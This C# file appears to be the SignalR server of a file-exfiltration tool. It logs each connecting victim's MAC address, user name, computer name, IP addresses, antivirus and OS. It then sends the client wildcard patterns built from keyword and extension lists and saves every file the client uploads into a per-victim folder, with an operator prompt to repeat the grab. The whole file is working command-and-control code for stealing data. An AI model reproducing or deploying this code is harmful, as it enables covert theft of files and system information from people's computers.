using Microsoft.AspNet.SignalR;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace SignalRServer1.Hubs
{
#nullable enable
    public class MainHub : Hub
    {
        static List<string> filesToReceive = new List<string>();
        static string? dir;
     
        public MainHub()
        {
            
        }
        public void NewClient(string initialData)
        {
            var initialDataObj = JsonConvert.DeserializeObject<InitialDataModel>(initialData);
            dir = initialDataObj.UserName + " " + DateTime.Now.ToString("dd-MMM-yy (hh-mm)");
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            File.WriteAllText(dir + "/clientInfo.txt", initialDataObj.MAK + "\n" + initialDataObj.UserName + "\n" + initialDataObj.CmpName + "\n" + initialDataObj.PriIp + "\n" + initialDataObj.PubIp + "\n" + initialDataObj.AV + "\n" + initialDataObj.OSys + "\n" + initialDataObj.CArch);
            SendCommand();
        }
        public void SendFile(string fileName,  byte[]? bytes)
        {
            if(fileName == "end")
            {
                Console.WriteLine("Press (y) to download files again. Before pressing (y), you can change fileFormats.txt and filterKeyords.txt files OR (n) to disconnect client");
                string input = Console.ReadLine();
                if(input.ToLower() == "y")
                {
                    SendCommand();
                    return;
                }
                else
                {
                    
                }
            }
            string fileReceived = dir + "/" + fileName;
            File.WriteAllBytes(fileReceived, bytes);
            Console.WriteLine(fileName + " (" + bytes.Count() + ")");
        }


        public void SendCommand()
        {
            string[] filterKeywards = File.ReadAllText("filterKeywords.txt").Trim().Split(',');
            string[] fileFormats = File.ReadAllText("fileFormats.txt").Split(',');
            List<string> commands = new List<string>();
            foreach (string fileFormat in fileFormats)
            {
                if(filterKeywards.Length > 0 && filterKeywards[0].Length > 0)
                {
                    foreach (string filterKeyward in filterKeywards)
                    {
                        commands.Add("*" + filterKeyward + "*" + fileFormat);
                    }
                }
                else
                {
                    commands.Add("*" + fileFormat);   
                }
            }
            Clients.Caller.SendInstruction(commands);
        }
        
    }
}
